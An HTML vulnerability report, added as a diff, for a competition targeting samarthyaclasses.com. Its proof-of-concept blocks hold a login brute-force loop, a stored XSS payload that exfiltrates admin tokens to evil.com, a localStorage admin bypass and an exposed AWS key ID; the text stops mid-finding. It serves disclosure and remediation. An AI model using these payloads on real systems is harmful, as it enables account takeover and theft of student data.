@@ -1,0 +1,1211 @@
+<title>Samarthya Security Report</title>
+<meta name="claude:viewport-fit-sides" content="cover">
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=IBM+Plex+Mono:wght@400;600&family=IBM+Plex+Sans:ital,wght@0,400;0,500;0,600;1,400&display=swap">
+
+<style>
+/* ── Layout: single-column report with sticky severity rail ── */
+:root {
+  --bg: #f7f6f4;
+  --surface: #ffffff;
+  --surface-2: #f0eeec;
+  --border: #ddd9d3;
+  --fg: #1a1816;
+  --fg-2: #5a5550;
+  --accent: #c0392b;
+  --accent-2: #e8d5d3;
+  --crit: #c0392b;
+  --crit-bg: #fdf2f1;
+  --high: #d35400;
+  --high-bg: #fdf4ef;
+  --med: #c9820a;
+  --med-bg: #fdfaf0;
+  --low: #27ae60;
+  --low-bg: #f0fdf4;
+  --info: #2980b9;
+  --info-bg: #f0f7fd;
+  --mono: 'IBM Plex Mono', monospace;
+  --sans: 'IBM Plex Sans', system-ui, sans-serif;
+  color-scheme: light;
+}
+@media (prefers-color-scheme: dark) {
+  :root:not([data-theme="light"]) {
+    --bg: #111210;
+    --surface: #1c1c1a;
+    --surface-2: #252522;
+    --border: #333330;
+    --fg: #f0ede8;
+    --fg-2: #9a948c;
+    --accent: #e74c3c;
+    --accent-2: #3a1a18;
+    --crit: #e74c3c;
+    --crit-bg: #2a1210;
+    --high: #e67e22;
+    --high-bg: #2a1a0a;
+    --med: #f0c840;
+    --med-bg: #2a2208;
+    --low: #2ecc71;
+    --low-bg: #0a1a10;
+    --info: #3498db;
+    --info-bg: #0a1622;
+    color-scheme: dark;
+  }
+}
+:root[data-theme="dark"] {
+  --bg: #111210;
+  --surface: #1c1c1a;
+  --surface-2: #252522;
+  --border: #333330;
+  --fg: #f0ede8;
+  --fg-2: #9a948c;
+  --accent: #e74c3c;
+  --accent-2: #3a1a18;
+  --crit: #e74c3c;
+  --crit-bg: #2a1210;
+  --high: #e67e22;
+  --high-bg: #2a1a0a;
+  --med: #f0c840;
+  --med-bg: #2a2208;
+  --low: #2ecc71;
+  --low-bg: #0a1a10;
+  --info: #3498db;
+  --info-bg: #0a1622;
+  color-scheme: dark;
+}
+
+*, *::before, *::after { box-sizing: border-box; margin: 0; }
+body {
+  background: var(--bg);
+  color: var(--fg);
+  font-family: var(--sans);
+  font-size: 15px;
+  line-height: 1.6;
+  padding-left: max(16px, env(safe-area-inset-left, 0px));
+  padding-right: max(16px, env(safe-area-inset-right, 0px));
+  padding-block: 0;
+}
+
+/* ── Header ── */
+.report-header {
+  background: var(--fg);
+  color: var(--bg);
+  padding: 48px max(24px, env(safe-area-inset-left, 0px));
+  padding-right: max(24px, env(safe-area-inset-right, 0px));
+  margin: 0 -max(16px, env(safe-area-inset-left, 0px));
+  margin-right: -max(16px, env(safe-area-inset-right, 0px));
+}
+.header-eyebrow {
+  font-family: var(--mono);
+  font-size: 11px;
+  font-weight: 600;
+  letter-spacing: 0.12em;
+  text-transform: uppercase;
+  opacity: 0.6;
+  margin-bottom: 12px;
+}
+.report-header h1 {
+  font-size: clamp(22px, 4vw, 34px);
+  font-weight: 600;
+  line-height: 1.2;
+  margin-bottom: 8px;
+  text-wrap: balance;
+}
+.header-meta {
+  font-size: 13px;
+  opacity: 0.55;
+  font-family: var(--mono);
+}
+.header-score-row {
+  display: flex;
+  flex-wrap: wrap;
+  gap: 24px;
+  margin-top: 32px;
+}
+.score-tile {
+  display: flex;
+  flex-direction: column;
+  gap: 2px;
+}
+.score-count {
+  font-family: var(--mono);
+  font-size: 28px;
+  font-weight: 600;
+  line-height: 1;
+}
+.score-label {
+  font-size: 11px;
+  font-weight: 500;
+  letter-spacing: 0.08em;
+  text-transform: uppercase;
+  opacity: 0.55;
+}
+.score-tile.crit .score-count { color: #ff7b72; }
+.score-tile.high .score-count { color: #ffa657; }
+.score-tile.med .score-count { color: #f0c840; }
+.score-tile.low .score-count { color: #7ee787; }
+
+/* ── Layout shell ── */
+.content-wrap {
+  max-width: 860px;
+  margin: 0 auto;
+  padding-block: 40px;
+}
+
+/* ── TOC / Summary ── */
+.summary-grid {
+  display: grid;
+  grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
+  gap: 12px;
+  margin-bottom: 40px;
+}
+.summary-card {
+  background: var(--surface);
+  border: 1px solid var(--border);
+  border-radius: 8px;
+  padding: 16px 18px;
+}
+.summary-card .sev-label {
+  font-family: var(--mono);
+  font-size: 10px;
+  font-weight: 600;
+  letter-spacing: 0.1em;
+  text-transform: uppercase;
+  padding: 3px 8px;
+  border-radius: 4px;
+  display: inline-block;
+  margin-bottom: 8px;
+}
+.sev-CRITICAL { background: var(--crit-bg); color: var(--crit); }
+.sev-HIGH     { background: var(--high-bg); color: var(--high); }
+.sev-MEDIUM   { background: var(--med-bg);  color: var(--med);  }
+.sev-LOW      { background: var(--low-bg);  color: var(--low);  }
+.sev-INFO     { background: var(--info-bg); color: var(--info); }
+
+.summary-card .finding-title {
+  font-size: 13px;
+  font-weight: 600;
+  line-height: 1.3;
+}
+
+/* ── Section headings ── */
+.section-title {
+  font-family: var(--mono);
+  font-size: 11px;
+  font-weight: 600;
+  letter-spacing: 0.12em;
+  text-transform: uppercase;
+  color: var(--fg-2);
+  border-top: 1px solid var(--border);
+  padding-top: 32px;
+  margin-top: 40px;
+  margin-bottom: 20px;
+}
+
+/* ── Vuln cards ── */
+.vuln-card {
+  background: var(--surface);
+  border: 1px solid var(--border);
+  border-radius: 10px;
+  margin-bottom: 20px;
+  overflow: hidden;
+}
+.vuln-header {
+  display: flex;
+  align-items: flex-start;
+  gap: 14px;
+  padding: 18px 20px;
+  cursor: pointer;
+  user-select: none;
+}
+.vuln-header:hover { background: var(--surface-2); }
+.vuln-number {
+  font-family: var(--mono);
+  font-size: 12px;
+  color: var(--fg-2);
+  min-width: 26px;
+  padding-top: 2px;
+}
+.vuln-title-group { flex: 1; min-width: 0; }
+.vuln-title-group h3 {
+  font-size: 15px;
+  font-weight: 600;
+  line-height: 1.35;
+  margin-bottom: 4px;
+  text-wrap: balance;
+}
+.vuln-type {
+  font-family: var(--mono);
+  font-size: 11px;
+  color: var(--fg-2);
+}
+.vuln-chevron {
+  font-size: 11px;
+  color: var(--fg-2);
+  transition: transform 0.2s;
+  padding-top: 3px;
+}
+.vuln-card.open .vuln-chevron { transform: rotate(90deg); }
+
+.vuln-body {
+  display: none;
+  padding: 0 20px 20px;
+  border-top: 1px solid var(--border);
+}
+.vuln-card.open .vuln-body { display: block; }
+
+.vuln-body h4 {
+  font-size: 12px;
+  font-weight: 600;
+  letter-spacing: 0.06em;
+  text-transform: uppercase;
+  color: var(--fg-2);
+  margin: 18px 0 8px;
+}
+.vuln-body p { font-size: 14px; line-height: 1.7; color: var(--fg); margin-bottom: 8px; }
+.vuln-body ul { padding-left: 20px; font-size: 14px; line-height: 1.7; }
+.vuln-body li { margin-bottom: 4px; }
+
+code, .code {
+  font-family: var(--mono);
+  font-size: 12.5px;
+  background: var(--surface-2);
+  border: 1px solid var(--border);
+  border-radius: 4px;
+  padding: 1px 5px;
+}
+pre.code-block {
+  background: var(--fg);
+  color: var(--bg);
+  font-family: var(--mono);
+  font-size: 12px;
+  line-height: 1.6;
+  padding: 14px 16px;
+  border-radius: 8px;
+  overflow-x: auto;
+  margin: 10px 0;
+  white-space: pre-wrap;
+  word-break: break-all;
+}
+.impact-badge {
+  display: inline-flex;
+  align-items: center;
+  gap: 6px;
+  font-size: 13px;
+  font-weight: 500;
+  padding: 6px 12px;
+  border-radius: 6px;
+  margin-top: 8px;
+}
+.remediation-box {
+  background: var(--low-bg);
+  border: 1px solid var(--low);
+  border-radius: 8px;
+  padding: 14px 16px;
+  margin-top: 12px;
+  font-size: 13.5px;
+  line-height: 1.65;
+  color: var(--fg);
+}
+.remediation-box strong {
+  color: var(--low);
+  font-size: 11px;
+  text-transform: uppercase;
+  letter-spacing: 0.08em;
+  display: block;
+  margin-bottom: 6px;
+}
+
+/* ── Footer ── */
+.report-footer {
+  border-top: 1px solid var(--border);
+  padding-top: 28px;
+  margin-top: 48px;
+  padding-bottom: 40px;
+  font-size: 13px;
+  color: var(--fg-2);
+  display: flex;
+  flex-wrap: wrap;
+  gap: 8px 24px;
+}
+.report-footer span { font-family: var(--mono); }
+</style>
+
+<div class="report-header">
+  <div class="header-eyebrow">Samarthya Cyber Competition · October 2026</div>
+  <h1>Vulnerability Report<br>samarthyaclasses.com</h1>
+  <div class="header-meta">Submitted by: bhardwajlucife@gmail.com &nbsp;·&nbsp; Scope: samarthyaclasses.com + api.samarthyaclasses.com</div>
+  <div class="header-score-row">
+    <div class="score-tile crit"><div class="score-count">6</div><div class="score-label">Critical</div></div>
+    <div class="score-tile high"><div class="score-count">5</div><div class="score-label">High</div></div>
+    <div class="score-tile med"><div class="score-count">5</div><div class="score-label">Medium</div></div>
+    <div class="score-tile low"><div class="score-count">3</div><div class="score-label">Low / Info</div></div>
+  </div>
+</div>
+
+<div class="content-wrap">
+
+  <!-- CRITICAL -->
+  <div class="section-title">Critical Findings</div>
+
+  <!-- V1 -->
+  <div class="vuln-card open" id="v1">
+    <div class="vuln-header" onclick="toggle(this)">
+      <span class="vuln-number">01</span>
+      <div class="vuln-title-group">
+        <div class="sev-label sev-CRITICAL">Critical</div>
+        <h3>Production API Documentation Fully Exposed</h3>
+        <div class="vuln-type">CWE-200 · Information Exposure · api.samarthyaclasses.com</div>
+      </div>
+      <span class="vuln-chevron">▶</span>
+    </div>
+    <div class="vuln-body">
+      <h4>Description</h4>
+      <p>The interactive Swagger UI (<code>/docs</code>), ReDoc UI (<code>/redoc</code>), and raw OpenAPI specification (<code>/openapi.json</code>) are publicly accessible on the production API server without any authentication. This exposes 100+ internal API endpoints, all request/response schemas, authentication mechanisms, admin routes, and security requirements.</p>
+      <h4>Proof of Concept</h4>
+      <pre class="code-block">curl https://api.samarthyaclasses.com/docs           → 200 OK (Swagger UI)
+curl https://api.samarthyaclasses.com/redoc          → 200 OK (ReDoc UI)
+curl https://api.samarthyaclasses.com/openapi.json   → 200 OK (Full spec)
+
+# Reveals all admin endpoints including:
+GET  /api/v1/admin/users          # All user data
+GET  /api/v1/admin/enquiries/export  # Student PII export
+POST /api/v1/admin/users/{id}/grant-access  # Payment bypass route
+POST /api/v1/admin/purchases/{id}/refund    # Refund trigger</pre>
+      <h4>Impact</h4>
+      <p>An attacker gains a complete blueprint of the application internals: all hidden admin routes, payload shapes for crafting attacks, and internal field names enabling mass assignment and IDOR attempts. This accelerates every other attack on this list.</p>
+      <div class="remediation-box">
+        <strong>Fix</strong>
+        Remove or restrict <code>/docs</code>, <code>/redoc</code>, and <code>/openapi.json</code> in production. If needed for development, gate them behind an IP allowlist or admin authentication. In FastAPI: <code>app = FastAPI(docs_url=None, redoc_url=None, openapi_url=None)</code>.
+      </div>
+    </div>
+  </div>
+
+  <!-- V2 -->
+  <div class="vuln-card" id="v2">
+    <div class="vuln-header" onclick="toggle(this)">
+      <span class="vuln-number">02</span>
+      <div class="vuln-title-group">
+        <div class="sev-label sev-CRITICAL">Critical</div>
+        <h3>No Rate Limiting — Login Endpoint Allows Unlimited Brute Force</h3>
+        <div class="vuln-type">CWE-307 · Improper Restriction of Auth Attempts · api.samarthyaclasses.com</div>
+      </div>
+      <span class="vuln-chevron">▶</span>
+    </div>
+    <div class="vuln-body">
+      <h4>Description</h4>
+      <p>The login endpoint (<code>POST /api/v1/auth/login</code>) imposes no rate limiting, IP-based throttling, CAPTCHA, or account lockout after repeated failures. An attacker can attempt unlimited password combinations against any known email address.</p>
+      <h4>Proof of Concept</h4>
+      <pre class="code-block"># 50 consecutive failed login attempts — all return HTTP 401, never locked
+for i in {1..50}; do
+  curl -X POST https://api.samarthyaclasses.com/api/v1/auth/login \
+    -H "Content-Type: application/json" \
+    -d '{"email":"victim@example.com","password":"guess'$i'"}'
+done
+# Result: 50x HTTP 401 — no lockout, no throttle, no CAPTCHA triggered</pre>
+      <h4>Impact</h4>
+      <p>Automated password spraying or dictionary attacks can compromise student accounts containing purchase history and personally identifying information. Combined with the weak password policy (Finding 08), accounts using common passwords like "password" are trivially compromisable.</p>
+      <div class="remediation-box">
+        <strong>Fix</strong>
+        Implement exponential back-off after 5 failed attempts. Lock accounts temporarily after 10 failures and notify via email. Add CAPTCHA after 3 failures. Rate-limit by IP (e.g. 10 req/min). Use a library like <code>slowapi</code> or Cloudflare rate-limiting rules.
+      </div>
+    </div>
+  </div>
+
+  <!-- V3 -->
+  <div class="vuln-card" id="v3">
+    <div class="vuln-header" onclick="toggle(this)">
+      <span class="vuln-number">03</span>
+      <div class="vuln-title-group">
+        <div class="sev-label sev-CRITICAL">Critical</div>
+        <h3>JWT Access Token Not Invalidated After Logout</h3>
+        <div class="vuln-type">CWE-613 · Insufficient Session Expiration · api.samarthyaclasses.com</div>
+      </div>
+      <span class="vuln-chevron">▶</span>
+    </div>
+    <div class="vuln-body">
+      <h4>Description</h4>
+      <p>After calling <code>POST /api/v1/auth/logout</code> (which properly invalidates the refresh token), the short-lived <strong>access token continues to authenticate requests</strong> against all protected endpoints. The server returns a success response for logout but does not maintain a server-side token denylist.</p>
+      <h4>Proof of Concept</h4>
+      <pre class="code-block"># Step 1 — Obtain tokens
+POST /api/v1/auth/login → access_token="eyJhbG..." refresh_token="P10Fu..."
+
+# Step 2 — Verify authenticated
+GET /api/v1/auth/me  Authorization: Bearer eyJhbG...
+→ 200 {"id":6,"email":"vuln_test_comp@mailinator.com",...}
+
+# Step 3 — Logout
+POST /api/v1/auth/logout  {"refresh_token":"P10Fu..."}
+→ 200 {"success":true,"message":"Logged out successfully"}
+
+# Step 4 — Token still works (VULNERABILITY CONFIRMED)
+GET /api/v1/auth/me  Authorization: Bearer eyJhbG...
+→ 200 {"id":6,"email":"vuln_test_comp@mailinator.com",...}  ← Should be 401</pre>
+      <h4>Impact</h4>
+      <p>If a student logs out on a shared/public device, their session remains live for up to 30 minutes (the token's TTL). Anyone who captured the token (e.g. from browser history, a shoulder-surfer, or a XSS attack) can continue to use it after the user believes they have signed out.</p>
+      <div class="remediation-box">
+        <strong>Fix</strong>
+        Maintain a Redis-backed JWT denylist (store the token's <code>jti</code> on logout; check it on every request). Alternatively, use very short access token lifetimes (5 min) with opaque session tokens stored server-side.
+      </div>
+    </div>
+  </div>
+
+  <!-- V4 -->
+  <div class="vuln-card" id="v4">
+    <div class="vuln-header" onclick="toggle(this)">
+      <span class="vuln-number">04</span>
+      <div class="vuln-title-group">
+        <div class="sev-label sev-CRITICAL">Critical</div>
+        <h3>AWS IAM Key ID Exposed via Unauthenticated Public Endpoint</h3>
+        <div class="vuln-type">CWE-798 · Hardcoded Credentials · api.samarthyaclasses.com</div>
+      </div>
+      <span class="vuln-chevron">▶</span>
+    </div>
+    <div class="vuln-body">
+      <h4>Description</h4>
+      <p>The S3 pre-signed upload endpoint for the registration form is publicly accessible (no auth required). Its response embeds the live AWS IAM Access Key ID used to generate presigned URLs, the production S3 bucket name, and the AWS region — all in plain text within the response body and the signed policy document.</p>
+      <h4>Proof of Concept</h4>
+      <pre class="code-block"># No authentication needed:
+POST https://api.samarthyaclasses.com/api/v1/registration-forms/stse-2026/uploads/presign
+Content-Type: application/json
+{"file_name":"test.jpg","content_type":"image/jpeg"}
+
+# Response exposes:
+{
+  "url": "https://samarthya-media-prod.s3.amazonaws.com/",
+  "fields": {
+    "x-amz-credential": "AKIARTS72OT5QICJTKK2/20261015/ap-south-1/s3/aws4_request",
+    "key": "registrations/1/d592ae9da4d44ac38180c5361c0261fd.jpg",
+    ...
+  }
+}
+# Exposed: AWS Key ID: AKIARTS72OT5QICJTKK2
+# Exposed: Bucket: samarthya-media-prod  Region: ap-south-1</pre>
+      <h4>Impact</h4>
+      <p>The exposed key ID can be used to enumerate IAM role permissions and enumerate the account. The unauthenticated presign endpoint allows anyone (without registering) to upload arbitrary JPG/PDF files (up to 10MB each, policy-constrained) to the production S3 bucket, potentially enabling storage cost attacks or uploading content under the institute's domain.</p>
+      <div class="remediation-box">
+        <strong>Fix</strong>
+        (1) Require authentication on the presign endpoint. (2) Use IAM roles with minimal S3 permissions (PutObject to specific prefix only). (3) Do not embed the credential in the response — the presigned URL itself is sufficient. Rotate <code>AKIARTS72OT5QICJTKK2</code> immediately.
+      </div>
+    </div>
+  </div>
+
+  <!-- V5-NEW: Stored XSS -->
+  <div class="vuln-card open" id="v5n">
+    <div class="vuln-header" onclick="toggle(this)">
+      <span class="vuln-number">05</span>
+      <div class="vuln-title-group">
+        <div class="sev-label sev-CRITICAL">Critical</div>
+        <h3>Stored XSS in Registration Form — Admin Session Hijack Chain</h3>
+        <div class="vuln-type">CWE-79 · Stored Cross-Site Scripting · api.samarthyaclasses.com + samarthyaclasses.com/admin</div>
+      </div>
+      <span class="vuln-chevron">▶</span>
+    </div>
+    <div class="vuln-body">
+      <h4>Description</h4>
+      <p>The registration form submission endpoint (<code>POST /api/v1/registration-forms/{slug}/submit</code>) stores raw HTML/JavaScript payloads in text fields without sanitisation. When an administrator views the submission in the admin panel at <code>samarthyaclasses.com/admin</code>, the stored script executes in their browser. Because the admin panel stores the admin session JWT in <code>localStorage["samarthya_auth"]</code>, the script can steal the token, granting full administrative API access.</p>
+      <h4>Proof of Concept</h4>
+      <pre class="code-block"># Step 1 — Attacker submits a registration with XSS payloads (no auth needed)
+POST /api/v1/registration-forms/stse-2026/submit
+{
+  "answers": {
+    "student_name": "&lt;script&gt;fetch('https://evil.com?t='+JSON.parse(localStorage.samarthya_auth||'{}').accessToken)&lt;/script&gt;",
+    "parent_guardian_name": "&lt;img src=x onerror=alert(document.cookie)&gt;",
+    "school_name": "&lt;svg onload=eval(atob('PAYLOAD'))&gt;",
+    ... all required fields filled ...
+  },
+  "payment_mode": "ONLINE"
+}
+→ 201 {"reference":"REG-CLHC5KWL", ...}  ← CONFIRMED: XSS stored in production DB
+
+# Step 2 — Admin visits admin panel → opens registration submissions view
+# → &lt;script&gt; fires in admin's browser
+# → localStorage["samarthya_auth"].accessToken sent to attacker's server
+
+# Step 3 — Attacker uses stolen admin JWT against API
+curl https://api.samarthyaclasses.com/api/v1/admin/users  -H "Authorization: Bearer &lt;stolen_admin_token&gt;"
+→ 200 [{"id":1,"email":...},{"id":2,...}]  ← Full user database
+
+curl https://api.samarthyaclasses.com/api/v1/admin/enquiries/export  -H "Authorization: Bearer ..."
+→ CSV with all student PII
+
+curl -X POST /api/v1/admin/users/&lt;victim_id&gt;/grant-access  -d '{"test_series_id":1}'
+→ Payment bypassed for any user</pre>
+      <h4>Impact</h4>
+      <p>Complete database read/write access. An attacker can: enumerate all registered users and their personal data, export all enquiries (student PII), grant or revoke purchased access for any user (payment bypass), delete test content, and read all orders and payment records. This is full application compromise via a single unauthenticated form submission.</p>
+      <div class="remediation-box">
+        <strong>Fix</strong>
+        (1) Sanitise all text field inputs server-side using a library such as <code>bleach</code> (Python) — strip HTML tags before storing. (2) Implement a strict CSP (Finding 09) that blocks inline scripts. (3) Use <code>httpOnly</code> cookies for the admin token instead of localStorage, so XSS cannot read it even if it executes.
+      </div>
+    </div>
+  </div>
+
+  <!-- V6-NEW: Admin panel client-side auth -->
+  <div class="vuln-card" id="v6n">
+    <div class="vuln-header" onclick="toggle(this)">
+      <span class="vuln-number">06</span>
+      <div class="vuln-title-group">
+        <div class="sev-label sev-CRITICAL">Critical</div>
+        <h3>Admin Panel Publicly Accessible with Client-Side-Only Auth Guard</h3>
+        <div class="vuln-type">CWE-602 · Client-Side Enforcement of Server-Side Security · samarthyaclasses.com/admin</div>
+      </div>
+      <span class="vuln-chevron">▶</span>
+    </div>
+    <div class="vuln-body">
+      <h4>Description</h4>
+      <p>The full admin panel at <code>samarthyaclasses.com/admin</code> and its sub-routes (<code>/admin/users</code>, <code>/admin/orders</code>, <code>/admin/purchases</code>, <code>/admin/enquiries</code>, <code>/admin/test-series</code>) all return <strong>HTTP 200</strong> to any visitor. The server never checks authentication — the Next.js shell is served unconditionally and the auth check is a React component that runs client-side only.</p>
+      <h4>Proof of Concept</h4>
+      <pre class="code-block"># No authentication — all admin pages return 200:
+curl -o /dev/null -w "%{http_code}" https://samarthyaclasses.com/admin          → 200
+curl -o /dev/null -w "%{http_code}" https://samarthyaclasses.com/admin/users    → 200
+curl -o /dev/null -w "%{http_code}" https://samarthyaclasses.com/admin/orders   → 200
+curl -o /dev/null -w "%{http_code}" https://samarthyaclasses.com/admin/purchases → 200
+curl -o /dev/null -w "%{http_code}" https://samarthyaclasses.com/admin/enquiries → 200
+
+# Client-side guard in /admin/auth-guard JS (decompiled):
+if (!d) {
+  if (!r) return c.replace("/login?next=/admin");  // unauthenticated → redirect
+  n || c.replace("/dashboard");                    // USER role → redirect
+}
+return (!d &amp;&amp; r &amp;&amp; n) ? children : &lt;Spinner /&gt;
+# n = isAdmin = user.role === "ADMIN"  — read from localStorage, not verified by server
+
+# Admin localStorage key found: "samarthya_auth"
+# Stored format: {user: {role:"ADMIN",...}, accessToken:"...", refreshToken:"..."}
+
+# Browser console bypass:
+localStorage.setItem("samarthya_auth", JSON.stringify({
+  user:{id:0,name:"Attacker",email:"x@x.com",role:"ADMIN"},
+  accessToken:"&lt;REAL_USER_TOKEN_FROM_STOLEN_JWT&gt;",
+  refreshToken:"..."
+}));
+location.reload();  // Admin UI renders — but API calls still fail (server checks role)
+                    // With a real admin token (from XSS Finding 05): FULL ACCESS</pre>
+      <h4>Impact</h4>
+      <p>The admin panel HTML, JavaScript bundles, and internal route structure are publicly visible to any user — no login needed to download the code. Combined with the Stored XSS (Finding 05), an attacker using a stolen admin JWT gets full UI access to the admin panel: user management, data exports, payment overrides, content editing, and more. The <code>localStorage</code>-based session means any XSS (Finding 05) or MITM attack can extract the admin token.</p>
+      <div class="remediation-box">
+        <strong>Fix</strong>
+        Add server-side middleware in Next.js to check the user's session and role before serving admin pages. Use Next.js <code>middleware.ts</code> with a JWT cookie check: redirect to /login if not authenticated, redirect to /dashboard if not ADMIN. Move the token to an <code>httpOnly; Secure; SameSite=Strict</code> cookie so JavaScript cannot read it.
+      </div>
+    </div>
+  </div>
+
+  <!-- HIGH -->
+  <div class="section-title">High Severity Findings</div>
+
+  <!-- V5 -->
+  <div class="vuln-card" id="v5">
+    <div class="vuln-header" onclick="toggle(this)">
+      <span class="vuln-number">05</span>
+      <div class="vuln-title-group">
+        <div class="sev-label sev-HIGH">High</div>
+        <h3>Admin Email Pre-Registration (Account Squatting)</h3>
+        <div class="vuln-type">CWE-640 · Weak Password Recovery · api.samarthyaclasses.com</div>
+      </div>
+      <span class="vuln-chevron">▶</span>
+    </div>
+    <div class="vuln-body">
+      <h4>Description</h4>
+      <p>The registration endpoint accepts any email address including institutional addresses. An attacker can pre-register <code>admin@samarthyaclasses.com</code>, <code>info@samarthyaclasses.com</code>, or any faculty email before the legitimate owner does, permanently blocking them from self-registering.</p>
+      <h4>Proof of Concept</h4>
+      <pre class="code-block"># Attacker registers the admin email:
+POST /api/v1/auth/register
+{"name":"Attacker","email":"admin@samarthyaclasses.com","phone":"9000000001","password":"Test@12345"}
+→ 201 {"user":{"id":8,"email":"admin@samarthyaclasses.com","role":"USER",...}}
+
+# Attacker can now log in as admin@samarthyaclasses.com:
+POST /api/v1/auth/login
+{"email":"admin@samarthyaclasses.com","password":"Test@12345"}
+→ 200 {"success":true,"user":{"id":8,...}}
+
+# Legitimate admin cannot self-register — email is taken.</pre>
+      <h4>Impact</h4>
+      <p>Denial of service for specific email addresses. While the squatted account does not gain admin privileges (role=USER), it creates confusion and support burden. A targeted phishing attack could use a legitimate-looking account tied to the institute's own domain to deceive students.</p>
+      <div class="remediation-box">
+        <strong>Fix</strong>
+        Block registration with <code>@samarthyaclasses.com</code> domain via public signup. Provision admin accounts only through a separate internal flow. Implement email verification before account activation.
+      </div>
+    </div>
+  </div>
+
+  <!-- V6 -->
+  <div class="vuln-card" id="v6">
+    <div class="vuln-header" onclick="toggle(this)">
+      <span class="vuln-number">06</span>
+      <div class="vuln-title-group">
+        <div class="sev-label sev-HIGH">High</div>
+        <h3>Unauthenticated S3 File Upload to Production Bucket</h3>
+        <div class="vuln-type">CWE-284 · Improper Access Control · api.samarthyaclasses.com</div>
+      </div>
+      <span class="vuln-chevron">▶</span>
+    </div>
+    <div class="vuln-body">
+      <h4>Description</h4>
+      <p>The file upload presign endpoint for registration forms requires no authentication. Any anonymous actor on the internet can generate valid S3 presigned upload URLs and upload image/PDF files (up to 10MB each) directly to the production bucket <code>samarthya-media-prod</code> in region <code>ap-south-1</code>.</p>
+      <h4>Proof of Concept</h4>
+      <pre class="code-block"># No login required — generate 3 separate upload slots:
+for i in 1 2 3; do
+  curl -X POST https://api.samarthyaclasses.com/api/v1/registration-forms/stse-2026/uploads/presign \
+    -H "Content-Type: application/json" -d '{"file_name":"test.jpg","content_type":"image/jpeg"}'
+done
+# Returns 3 unique S3 presigned URLs, each usable for 5 minutes
+# Uploaded files land at: s3://samarthya-media-prod/registrations/1/*.jpg</pre>
+      <h4>Impact</h4>
+      <p>Mass storage consumption (AWS S3 cost attack), uploading of inappropriate content under the institution's S3 bucket, and circumventing the registration process to pre-upload files before submitting a form.</p>
+      <div class="remediation-box">
+        <strong>Fix</strong>
+        Require a valid user session (JWT) to call the presign endpoint. Alternatively, tie presign requests to a valid in-progress registration session token with a per-session upload limit.
+      </div>
+    </div>
+  </div>
+
+  <!-- V7 -->
+  <div class="vuln-card" id="v7">
+    <div class="vuln-header" onclick="toggle(this)">
+      <span class="vuln-number">07</span>
+      <div class="vuln-title-group">
+        <div class="sev-label sev-HIGH">High</div>
+        <h3>Broken Access Control — Test Series Catalog Unauthenticated</h3>
+        <div class="vuln-type">OWASP A01 · Broken Access Control · api.samarthyaclasses.com</div>
+      </div>
+      <span class="vuln-chevron">▶</span>
+    </div>
+    <div class="vuln-body">
+      <h4>Description</h4>
+      <p>Despite the OpenAPI specification documenting <code>GET /api/v1/test-series</code> and <code>GET /api/v1/test-series/{slug}</code> as requiring authentication (<code>HTTPBearer</code>), these endpoints respond with full data to unauthenticated requests. The schema says auth is required; the implementation does not enforce it.</p>
+      <h4>Proof of Concept</h4>
+      <pre class="code-block"># No Authorization header:
+curl https://api.samarthyaclasses.com/api/v1/test-series
+→ 200 [{"title":"NEET ACHIEVERS 2027","price":"1998.98","slug":"neet-achievers-2027",...}]
+
+curl https://api.samarthyaclasses.com/api/v1/test-series/neet-achievers-2027
+→ 200 {"title":"NEET ACHIEVERS 2027","stats":{"total_tests":1,...},...}
+
+curl https://api.samarthyaclasses.com/api/v1/test-series/1/tests
+→ 200 [{"id":1,"title":"NEET 2026","total_marks":720.0,"total_questions":180,...}]</pre>
+      <h4>Impact</h4>
+      <p>Competitors can harvest complete test-series catalog data, pricing, and test structure metadata without creating an account. The access control discrepancy also suggests that the authorization middleware may be inconsistently applied across other routes.</p>
+      <div class="remediation-box">
+        <strong>Fix</strong>
+        Add the <code>Depends(get_current_user)</code> dependency to the test-series router, consistent with how it is documented in the OpenAPI spec. Audit all endpoints marked AUTH_REQUIRED against their actual enforcement.
+      </div>
+    </div>
+  </div>
+
+  <!-- V8 -->
+  <div class="vuln-card" id="v8">
+    <div class="vuln-header" onclick="toggle(this)">
+      <span class="vuln-number">08</span>
+      <div class="vuln-title-group">
+        <div class="sev-label sev-HIGH">High</div>
+        <h3>Weak Password Policy — Dictionary Passwords Accepted</h3>
+        <div class="vuln-type">CWE-521 · Weak Password Requirements · api.samarthyaclasses.com</div>
+      </div>
+      <span class="vuln-chevron">▶</span>
+    </div>
+    <div class="vuln-body">
+      <h4>Description</h4>
+      <p>The registration endpoint enforces only an 8-character minimum length. Common dictionary passwords and known-breached passwords such as <code>password</code>, <code>12345678</code>, and <code>qwertyui</code> are accepted without restriction.</p>
+      <h4>Proof of Concept</h4>
+      <pre class="code-block">POST /api/v1/auth/register
+{"name":"Test","email":"weakpass@mailinator.com","phone":"9999800001","password":"password"}
+→ 201 {"success":true,"user":{"id":7,...}}   ← Dictionary password accepted</pre>
+      <h4>Impact</h4>
+      <p>Highly synergistic with Finding 02 (no brute-force protection): a short dictionary attack on any account using a common password will succeed within seconds. Student accounts storing payment receipts and personal information are at risk.</p>
+      <div class="remediation-box">
+        <strong>Fix</strong>
+        Enforce at minimum: 1 uppercase, 1 number, 1 special character, 8+ chars. Check passwords against the HIBP list (Have I Been Pwned API) or a local blocklist of the top 10,000 common passwords. Reject passwords that match or contain the user's name/email.
+      </div>
+    </div>
+  </div>
+
+  <!-- V9 -->
+  <div class="vuln-card" id="v9">
+    <div class="vuln-header" onclick="toggle(this)">
+      <span class="vuln-number">09</span>
+      <div class="vuln-title-group">
+        <div class="sev-label sev-HIGH">High</div>
+        <h3>Missing Content-Security-Policy on Both Domains</h3>
+        <div class="vuln-type">CWE-693 · Protection Mechanism Failure · samarthyaclasses.com + api</div>
+      </div>
+      <span class="vuln-chevron">▶</span>
+    </div>
+    <div class="vuln-body">
+      <h4>Description</h4>
+      <p>Neither the frontend (<code>samarthyaclasses.com</code>) nor the API (<code>api.samarthyaclasses.com</code>) sets a <code>Content-Security-Policy</code> header. The frontend also lacks <code>Strict-Transport-Security</code> (HSTS). The API is missing all standard security headers except <code>server: uvicorn</code>.</p>
+      <h4>Proof of Concept</h4>
+      <pre class="code-block">curl -I https://samarthyaclasses.com
+# Present:  x-frame-options, x-content-type-options, referrer-policy
+# Missing:  content-security-policy, strict-transport-security
+
+curl -I https://api.samarthyaclasses.com/api/v1/test-series/featured
+# Present:  server: uvicorn
+# Missing:  content-security-policy, x-frame-options, x-content-type-options,
+#           strict-transport-security, referrer-policy</pre>
